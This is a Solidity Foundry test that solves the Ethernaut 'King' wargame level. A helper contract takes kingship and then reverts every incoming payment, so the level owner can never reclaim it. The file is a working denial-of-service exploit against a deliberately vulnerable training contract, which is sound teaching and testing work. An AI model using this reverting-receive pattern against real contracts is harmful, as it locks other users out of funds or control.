// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/core/Ethernaut.sol";
import "../src/levels/09-KingFactory.sol";

contract KingHackHelperContract {
    King private kingContract;

    constructor(address _kingContractAddress) {
        kingContract = King(payable(_kingContractAddress));
    }

    function becomeKing() public payable returns (bool) {
        (bool isSuccessful, ) = payable(kingContract).call{value: msg.value}(
            ""
        );
        if (!isSuccessful) {
            revert();
        }
        return kingContract._king() == address(this);
    }

    receive() external payable {
        revert();
    }
}

contract KingHackTest is Test {
    Ethernaut ethernaut;
    address attacker = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testKingHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        KingFactory factory = new KingFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance{
            value: 0.001 ether
        }(factory);

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // When the level instance is submitted, KingFactory would trigger `call` with an ether value, that would trigger `receive`
        // The ether value is 0 but this does not matter because the owner can claim kingship without putting in more ether
        // The main feature of our hack helper contract is the revert on our receive function
        // Once we claim kingship, we submit the level instance
        // When the level (owner) try to reclaim kingship, it would trigger the receive function in our hack helper contract that would revert
        // And thus kingship cannot be claimed back by the owner
        KingHackHelperContract hackHelperContract = new KingHackHelperContract(
            levelAddress
        );
        // This ether value does not matter
        bool isSuccessful = hackHelperContract.becomeKing{value: 0.5 ether}();
        assertTrue(isSuccessful);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
